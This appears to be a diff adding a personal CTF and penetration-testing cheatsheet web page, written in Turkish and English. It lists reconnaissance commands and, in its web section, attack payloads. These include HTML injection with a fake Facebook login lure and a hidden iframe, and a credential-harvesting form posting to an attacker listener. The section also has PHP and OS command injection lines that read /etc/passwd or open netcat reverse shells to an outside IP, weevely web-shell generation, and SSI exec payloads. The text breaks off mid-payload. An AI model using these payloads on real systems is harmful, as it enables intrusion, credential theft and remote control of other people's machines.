@@ -1,0 +1,2601 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+	<meta charset="utf-8">
+	<meta name="author" content="Oğulcan KAÇAR - Cheatsheet">
+	<meta name="description" content="CTF, Cheatsheet, html injection, php injection">
+	<meta name="keywords" content="Siber Güvenlik, Cyber Security, Oğulcan KAÇAR, Cheatsheet">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" type="text/css" href="Styles/style.css">
+	<link rel="shortcut icon" href="Images/icon.png">
+	<title>Oğulcan KAÇAR - Cheatsheet</title>
+</head>
+<body>
+	<header id="üst" class="row">
+		<div id="logo" class="col-2">
+			<a href="index.html"><img src="Images/logo.png" title="Oğulcan KAÇAR" alt="logo"></a>
+		</div>
+		<div id="sosyal" class="col-10">
+			
+			<div id="icon">
+				<a href="https://tryhackme.com/p/ogulcanKacar" target="_blank"><img style="background: white; border-radius: 15px;"src="Images/tryhackme.png" title="tryhackme" alt="tryhackme"></a>
+			</div>
+			<div id="icon">
+				<a href="https://discord.gg/tzxfQmut" target="_blank"><img src="Images/discord.png" title="discord" alt="discord"></a>
+			</div>
+			<div id="icon">
+				<a  href="mailto:oglcnkcr54_kcr@outlook.com"><img src="Images/outlook.png" alt="outlook" title="outlook"></a>
+			</div>
+			<div id="icon">
+				<a href="https://play.google.com/store/apps/dev?id=6520298174878575178" target="_blank"><img src="Images/googlePlay.png" alt="google play" title="google play"></a>
+			</div>
+			<div id="icon">
+				<a href="https://www.instagram.com/ogulcan_kcr" target="_blank"><img src="Images/instagram.png" title="instagram" alt="instagram"></a>
+			</div>
+		</div>
+	</header>
+
+	<nav id="menu" class="row">
+		<div id="anamenu" class="col-12">
+			<ul>
+				<li><a href="#scan">Scan</a></li>
+				<li><a href="#web">Web</a></li>
+				<li><a href="#bruteforce">Bruteforce</a>
+				<li><a href="#hash">Hash</a></li>
+				<li><a href="#analyzer">Analyzer</a></li>
+				<li><a href="#connect">Connect</a></li>
+				<li><a href="#privilege">Privilege Escalation</a></li>
+				<li><a href="#network">Network Forensic</a></li>
+				<li><a href="#android">Android Forensic</a></li>
+			</ul>
+		</div>
+	</nav>
+
+	<div id="orta" class="row">
+		<secltion id="icerik" class="col-8">
+
+			<div id="C1">
+				<h1 id="scan" align=center style='color: yellow; position: relative; top: 20px; text-align:center'>SCAN</h1>
+				<pre>
+					
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>1) </span><a name="_Hlk62579877"><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>dirbuster<o:p></o:p></span></a></p>
+
+<p class=MsoNormal><span style='mso-bookmark:_Hlk62579877'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:yellow'>2) </span></span><span style='mso-bookmark:_Hlk62579877'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>dirb &lt;</span></span><span style='mso-bookmark:_Hlk62579877'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>http://_______</span></span><span style='mso-bookmark:_Hlk62579877'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>&gt; <o:p></o:p></span></span></p>
+
+<p class=MsoNormal><span style='mso-bookmark:_Hlk62579877'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:yellow'>3) </span></span><span style='mso-bookmark:_Hlk62579877'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>gobuster dir -u &lt;</span></span><span style='mso-bookmark:_Hlk62579877'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>http://&lt;ip&gt; -w /usr/share/wordlists/dirb/common.txt</span></span><span
+style='mso-bookmark:_Hlk62579877'><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'>&gt;<o:p></o:p></span></span></p>
+
+<p class=MsoNormal><span style='mso-bookmark:_Hlk62579877'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:yellow'>3) </span></span><span style='mso-bookmark:_Hlk62579877'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>wafw00f &lt;</span></span><span style='mso-bookmark:_Hlk62579877'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>___.com</span></span><span style='mso-bookmark:_Hlk62579877'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>&gt;<span style='mso-tab-count:1'>         </span>// if found say
+&gt; behin<o:p></o:p></span></span></p>
+
+<p class=MsoNormal><span style='mso-bookmark:_Hlk62579877'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:yellow'>4) </span></span><span style='mso-bookmark:_Hlk62579877'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>wps &lt;</span></span><span style='mso-bookmark:_Hlk62579877'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>___.com</span></span><span style='mso-bookmark:_Hlk62579877'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>&gt; <span style='mso-tab-count:1'>    </span><span
+style='mso-tab-count:1'>            </span>// wordpress<o:p></o:p></span></span></p>
+
+<p class=MsoNormal><span style='mso-bookmark:_Hlk62579877'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:yellow'>5) </span></span><span style='mso-bookmark:_Hlk62579877'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>nikto -h &lt;</span></span><a href="http://10.0.2.1"><span
+style='mso-bookmark:_Hlk62579877'><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif'>http://10.0.2.1</span></span></a><span
+style='mso-bookmark:_Hlk62579877'><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'>&gt;<o:p></o:p></span></span></p>
+
+<p class=MsoNormal><span style='mso-bookmark:_Hlk62579877'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:yellow'>6) </span></span><span style='mso-bookmark:_Hlk62579877'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>nmap -PS -f -sS -sV -sC -D RND:5 –spoof-mac 0 -sP -p- &lt;</span></span><span
+style='mso-bookmark:_Hlk62579877'><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:#00B0F0'>ip</span></span><span
+style='mso-bookmark:_Hlk62579877'><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'>&gt;<span
+style='mso-spacerun:yes'>  </span><o:p></o:p></span></span></p>
+
+<p class=MsoNormal><span style='mso-bookmark:_Hlk62579877'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:yellow'>7) </span></span><span style='mso-bookmark:_Hlk62579877'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>searchsploit &lt;</span></span><span style='mso-bookmark:_Hlk62579877'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>search version</span></span><span style='mso-bookmark:_Hlk62579877'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>&gt;<o:p></o:p></span></span></p>
+
+<p class=MsoNormal><span style='mso-bookmark:_Hlk62579877'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:yellow'>8) </span></span><span style='mso-bookmark:_Hlk62579877'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>enum4linux -a &lt;</span></span><span style='mso-bookmark:_Hlk62579877'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>10.10.38.56 | tee enum4linux.log</span></span><span
+style='mso-bookmark:_Hlk62579877'><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'>&gt; </span></span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>for use enum<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:red'><span style='mso-spacerun:yes'>    </span>resutl:
+S-1-22-1-1000 Unix </span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>User\kay </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>(Local User) and try hydra attack<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>9) </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>theharvester -d
+&lt;</span><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>hedef.com</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>&gt; -l 1500 -b </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>google </span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>-f &lt;</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>sonuclar.txt</span><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'>&gt;<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>10) </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>netcraf.com<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>11) </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>yougetsignel.com<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>12) </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>subrute github:
+</span><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>python3 subbrute &lt;</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>hedef.com</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>&gt;</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'><o:p></o:p></span></p>
+
+
+				</pre>
+
+			</div>
+
+			<div id="C2">
+				<h1 id="web" align=center style='text-align:center; color: yellow;'>WEB</h1>
+				<pre>
+					<p class=MsoNormal><b><span style='font-size:12.0pt; text-align: center;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'>Html İnjection - Reflected
+(GET)<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>1) </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>&lt;h1&gt; </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>ogulcan </span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>&lt;/h1&gt;</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>2) </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>&lt;img src=</span><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>/ </span></b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>onerror=&quot;</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>alert('test’)&quot;</span><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:#00B0F0'>&gt;&lt;img&gt;</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>3) </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>use to beef and
+send this url<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:red'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:red'>&lt;h1 aligb=”center”&gt; Facebook için
+giriş yap &lt;/h1&gt; <o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:red'>&lt;a href=”https://www.facebook.com”
+target=”_blank”&gt; &lt;img src=”facebook.ico url” <o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:red'>&lt;/a&gt;<o:p></o:p></span></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'>Html Injection - Stored<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>1) </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>&lt;iframe
+src=&quot;</span><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:red'>https://avatars0.githubusercontent.com/u/63792003?s=460&amp;u=aaf8df93edc1091ae1a1e46a9589b413324b284e&amp;v=4</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>&quot;&gt;&lt;/iframe&gt;</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>2) </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>&lt;iframe
+src=&quot;</span><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:red'>http://10.0.2.19:5050/testFolder</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>&quot; height=&quot;</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>0</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>&quot; width=&quot;</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>0</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>&quot;&gt;&lt;/iframe&gt;<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'><span style='mso-spacerun:yes'> </span><span
+style='mso-spacerun:yes'>     </span><span style='mso-spacerun:yes'> </span></span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>nc -nvlp </span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>5050<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:red'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>&lt;form name=&quot;Login&quot;
+action=&quot;http://10.0.2.19:5050/test.html&quot;&gt;<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'><span style='mso-tab-count:1'>            </span>&lt;table&gt;<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'><span style='mso-tab-count:2'>                        </span>&lt;tr&gt;&lt;td&gt;username:
+&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot;
+placeholder=&quot;username&quot;&gt;&lt;/td&gt;&lt;/tr&gt;<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'><span style='mso-tab-count:2'>                        </span>&lt;tr&gt;&lt;td&gt;password:
+&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;password&quot;
+name=&quot;username&quot; placeholder=&quot;password&quot;&gt;&lt;/td&gt;&lt;/tr&gt;<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'><span style='mso-tab-count:1'>            </span>&lt;/table&gt;<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'><span style='mso-tab-count:1'>            </span>&lt;input
+type=&quot;submit&quot; value=&quot;Login&quot;&gt;<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'>PHP Code İnjection<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>-</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'> </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>;</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>-</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'> </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>|</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>- </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>&amp;&amp;</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>-</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'> test</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>;system(&quot;</span><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'>whomi</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>&quot;)</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>-</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'> test</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>;system(&quot;</span><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'>cat /etc/passwd</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>&quot;)</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>-</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'> test</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>;system(&quot;</span><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'>nc &lt;ip&gt; &lt;port&gt;
+-e /bin/bash</span><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B0F0'>&quot;)</span><span style='font-size:
+12.0pt;line-height:107%;font-family:"Times New Roman",serif;color:red'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>- </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>test</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>;system(&quot;</span><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'>nc &lt;ip&gt; &lt;port&gt;
+-e /bin/bash</span><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B0F0'>&quot;)</span><span style='font-size:
+12.0pt;line-height:107%;font-family:"Times New Roman",serif;color:red'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>-</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'> nc -nvlp &lt;</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>port</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>&gt;<o:p></o:p></span></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'>Unrestricted File Upload<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>- </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>weevely</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'> </span><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B0F0'>&lt;</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>url</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>&gt;</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'> </span><span style='font-size:
+12.0pt;line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>&lt;</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>password</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>&gt;</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>-</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'> </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>weevely generate </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>1234
+myweevely.php<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>- </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>if php is not
+working, then you try </span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>php3</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>, </span><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B0F0'>php4</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>, </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>php5</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'><o:p></o:p></span></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'>OS Command Injection<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>-</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'> </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>;</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>whoami<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>- </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>|</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>whoami<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>-</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'> </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>&amp;&amp;</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>whoami<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>- </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>1blabla;nc
+192.168.1.42 5050 -e /bin/sh<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>-</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'> commix
+--url&quot;</span><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B0F0'>&lt;url&gt;</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>&quot;</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'> </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>-cookie=&quot;</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>&lt;cookie&gt;</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>&quot;</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'> </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>--data=&quot;</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>&lt;target&gt;</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>&quot;<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:red'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'>SSI Enjecksiyonu<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>- </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>shtml<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B0F0'>&lt;!--#exec cmd=&quot;ls&quot; --&gt;<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B0F0'>&lt;!--#exec cmd=”nc -nvlp 5050 -e
+/bin/bash”&gt;<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:yellow'>- </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>test</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>;system(&quot;</span><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'>nc &lt;ip&gt; &lt;port&gt;
